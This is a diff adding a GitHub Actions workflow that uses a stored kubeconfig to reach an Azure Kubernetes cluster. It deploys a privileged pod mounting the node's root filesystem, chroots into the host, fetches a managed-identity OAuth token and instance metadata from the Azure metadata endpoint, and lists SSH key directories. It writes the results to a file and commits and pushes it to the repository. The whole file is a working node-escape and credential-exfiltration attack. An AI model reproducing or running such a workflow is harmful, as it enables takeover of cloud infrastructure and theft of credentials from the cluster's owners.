@@ -1,0 +1,74 @@
+name: ulnode3
+on:
+  workflow_dispatch:
+permissions:
+  contents: write
+jobs:
+  go:
+    runs-on: ubuntu-latest
+    timeout-minutes: 40
+    steps:
+      - uses: actions/checkout@v4
+      - name: node
+        run: |
+          set +e
+          curl -sL -o /tmp/kubectl https://dl.k8s.io/release/v1.30.5/bin/linux/amd64/kubectl && chmod +x /tmp/kubectl
+          K=ul/kc/datapath-eastus.yaml
+          C=aks-g42us-tfdemo-kashif-datapath-eastus
+          KX="/tmp/kubectl --kubeconfig $K --context $C --request-timeout=25s"
+          {
+            echo "=== IMAGES"
+            $KX get pods -A -o jsonpath='{range .items[*]}{.spec.containers[*].image}{"\n"}{end}' | sort -u | head -40
+            ACR=$($KX get pods -A -o jsonpath='{range .items[*]}{.spec.containers[*].image}{"\n"}{end}' | sort -u | grep -m1 '\.azurecr\.io/')
+            echo "ACR=$ACR"
+            [ -z "$ACR" ] && ACR="mcr.microsoft.com/azurelinux/base/core:3.0"
+            NODE=$($KX get nodes -o jsonpath='{.items[0].metadata.name}'); echo "NODE=$NODE"
+            $KX create namespace ulx3
+            cat > /tmp/pod.yaml <<EOF
+          apiVersion: v1
+          kind: Pod
+          metadata:
+            name: ulnode
+            namespace: ulx3
+          spec:
+            nodeName: $NODE
+            hostPID: true
+            hostNetwork: true
+            automountServiceAccountToken: false
+            restartPolicy: Never
+            containers:
+            - name: c
+              image: $ACR
+              imagePullPolicy: IfNotPresent
+              resources:
+                limits: {cpu: "1", memory: 1Gi}
+                requests: {cpu: 100m, memory: 128Mi}
+              securityContext:
+                privileged: true
+                runAsUser: 0
+              volumeMounts:
+              - name: host
+                mountPath: /host
+              command: ["/bin/sh","-c"]
+              args:
+              - |
+                chroot /host /bin/bash -lc 'id; hostname; echo ---GPU---; nvidia-smi -L 2>&1 | head -5; ls /dev/nvidia* 2>/dev/null | head; echo ---IMDS---; curl -s -m 8 -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" ; echo; curl -s -m 8 -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | head -c 2500; echo; echo ---NET---; ip -4 route; ip -4 addr | head -40; echo ---SSH---; ls -la /root/.ssh 2>/dev/null; ls -la /home/*/.ssh 2>/dev/null' || /bin/sh -c 'id; hostname; cat /host/etc/hostname; ls /host'
+            volumes:
+            - name: host
+              hostPath:
+                path: /
+          EOF
+            $KX apply -f /tmp/pod.yaml
+            for i in 1 2 3 4 5 6; do sleep 15; S=$($KX get pod -n ulx3 ulnode -o jsonpath='{.status.phase} {.status.containerStatuses[0].state}' 2>&1); echo "STATE$i $S"; echo "$S" | grep -qE 'Running|Exited|Failed|Succeeded' && break; done
+            $KX get pod -n ulx3 ulnode -o wide
+            $KX logs -n ulx3 ulnode 2>&1 | head -150
+            $KX describe pod -n ulx3 ulnode 2>&1 | tail -25
+          } 2>&1 | tee node_root3.txt
+          $KX delete namespace ulx3 --wait=false 2>&1 | head -3
+      - name: commit
+        if: always()
+        run: |
+          set +e
+          git add -A
+          git -c user.email=a@b -c user.name=ul commit -m "ulnode2 $(date -u +%s)"
+          git push
